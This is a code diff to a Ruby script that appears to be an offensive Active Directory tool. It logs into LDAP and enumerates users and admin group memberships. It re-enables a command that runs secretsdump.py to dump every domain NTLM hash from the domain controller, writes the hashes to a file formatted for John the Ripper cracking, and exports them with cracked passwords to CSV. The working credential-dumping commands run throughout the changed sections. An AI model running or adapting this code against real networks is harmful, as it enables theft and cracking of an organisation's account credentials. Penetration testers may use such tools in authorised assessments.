@@ -123,6 +123,7 @@ unless opts[:restore]
 			puts "[+] LDAP connection successful with credentials: #{opts[:domain]}\\#{opts[:username]}:#{opts[:password]}\n".green
 			tld = opts[:tld].split("\.").join(",dc=")
 			treebase = "dc=#{opts[:domain]},dc=#{tld}"
+			puts "Treebase:#{treebase}"
 		else
 			puts "[-] Unable to authenticate to LDAP, Error: #{ldap_con.get_operation_result.message}, you need a username, password and domain".red
 			puts "Tried with #{opts[:domain]}\\#{opts[:username]}:#{opts[:password]}\n"
@@ -141,6 +142,12 @@ else
 		elsif object.is_a? Computer
 			Computer.all_computers << object
 		end
+	end
+end
+
+if opts[:cracked]
+	File.readlines(opts[:cracked]).each do |hash|
+		User.cracked(hash)
 	end
 end
 
@@ -172,15 +179,20 @@ unless opts[:restore]
 	end
 
 	if opts[:queryuser]
+		puts "Query:#{User.find_user(opts[:queryuser])}"
 		rows = []
 		ldap_con.search( :base => treebase, :filter => User.find_user(opts[:queryuser])) do |entry|
 			member_of = []
 			ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs|
+				if memberofs.name[-1].to_s =~ /admin/
+					@admin = true
+				end
+				pp @admin
 				member_of << memberofs.name
 			end
 			@u = User.new(entry, member_of)
 		 	rows << ["Username", @u.name]
-		 	rows << ["Admin", @u.admin]
+		 	rows << ["Admin", @admin]
 		 	rows << ["Enabled", @u.enabled]
 		 	rows << ["Logon Count", @u.logon_count]
 		 	rows << ["Member Of", @u.member_of.join(", ")]
@@ -211,15 +223,16 @@ unless opts[:restore]
 	end
 
 	if opts[:enumallusers]
+		if !opts[:nonestedmembers]
+		puts "Hmm, enumerating the whole domain with nested group enumeration...that could take a while, maybe try --nonestedmembers".yellow
+		end
 		rows = []
-		count = 0
 			ldap_con.search( :base => treebase, :filter => User.find_all_users) do |entry|
-				print (count += 1).to_s.green
+				print (".").to_s.green
 				member_of = []
 				# pp entry
 				## You need to implement a flag to boolean nested and non nested enumeration
 				if !opts[:nonestedmembers]
-					puts "Hmm, enumerating the whole domain with nested group enumeration...that could take a while, maybe try --nonestedmembers".yellow
 					ldap_con.search( :base => treebase, :filter => User.recursive_user_memberof(entry.dn)) do |memberofs|
 						member_of << memberofs.name
 					end
@@ -303,24 +316,21 @@ unless opts[:restore]
 			User.all_users.uniq! {|user| user.name}
 			unless User.all_users.empty?
 				#Something doesnt work here, needs some work
-				# if opts[:enumallusers]
-				# 	# output = ""
-				# 	cmd = TTY::Command.new
-				# 	connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-ntlm")
-				# 	connection.each do |line|
-				# 		if line.include? ":::"
-				# 			User.all_hash(line)
-				# 		end
-				# 	end
-				# else
-					User.all_users.each do |user|
-						if user.enabled == false
-							next
+				if opts[:enumallusers]
+					# output = ""
+					cmd = TTY::Command.new
+					connection = cmd.run("python /usr/local/bin/secretsdump.py #{opts[:domain]}/#{opts[:username]}\:\"#{opts[:password]}\"\@#{opts[:host]} -just-dc-ntlm")
+					connection.each do |line|
+						if line.include? ":::"
+							User.all_hash(line)
 						end
+					end
+				else
+					User.all_users.each do |user|
 						output = ''
 						cmd = TTY::Command.new(output: output)
 						#this path is correct in both OSX and Kali
-						connection = cmd.run("python /usr/local/bin/secretsdump.py \'#{opts[:domain]}/#{opts[:username]}\:#{opts[:password]}\'\@#{opts[:host]} -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
+						connection = cmd.run("python /usr/local/bin/secretsdump.py \'#{opts[:domain]}/#{opts[:username]}\:#{opts[:password]}\'\@#{opts[:host]} -just-dc-ntlm -just-dc-user \"#{opts[:domain]}/#{user.name}\"")
 						if connection.out =~ /\:\:\:$/
 							user.hash = connection.out.split("\n")[4]
 							user.hash_type = User.hash_type(user.hash)
@@ -334,7 +344,7 @@ unless opts[:restore]
 							# throw :nopriv
 						end
 					end
-				# end
+				end
 				puts "\nWriting to JTR readable format".green
 				File.open("spotlight_to_john.txt", "w+") do |line|
 					User.all_users.each do |user|
@@ -348,15 +358,10 @@ unless opts[:restore]
 		end
 	end
 end
-if opts[:cracked]
-	File.readlines(opts[:cracked]).each do |hash|
-		User.cracked(hash)
-	end
-end
+
 #Some CSV output
 if opts[:csv]
 	puts "Writing CSV Files".green
-
 	unless User.all_users.empty?
 		CSV.open("users_output.csv", "w+") do |csv|
 			csv << ["Username", "Admin", "Enabled", "Logon Count", "Description", "Created", "Changed", "Password Last Changed", "Last bad password attempt", "Expires", "Hash", "Hash Type", "Password", "Member of"]
@@ -421,5 +426,5 @@ if opts[:csv]
 end
 
 unless opts[:restore]
-	# write_logs
+	write_logs
 end
